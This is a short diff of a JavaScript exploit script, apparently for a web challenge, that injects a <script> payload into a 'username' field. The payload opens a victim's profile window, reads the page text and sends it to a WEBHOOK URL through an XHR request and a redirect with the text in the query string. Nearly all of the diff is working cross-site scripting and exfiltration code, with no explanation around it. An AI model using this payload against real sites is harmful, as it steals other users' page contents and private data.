@@ -17,7 +17,7 @@ function post(url, data) {
 }
 
 function imgEnd() {
-  window.location.href = PROFILE;
+  window.location = PROFILE;
 }
 
 // const queryString = window.location.search;
@@ -28,10 +28,10 @@ try {
   window.open(PROFILE, OPEN);
 
   const payload = `
-const profile = window.open("", "${OPEN}");
 let xhr = new XMLHttpRequest();
-xhr.open("POST", "${WEBHOOK}", false);
-xhr.send(profile.document.body.innerText);
+xhr.open("GET", "${WEBHOOK}", false);
+xhr.send(null);
+const profile = window.open("", "${OPEN}");
 window.location = "${WEBHOOK}?" + profile.document.body.innerText;
 `;
   document.getElementById("username").value = `<script>${payload}</script>`;
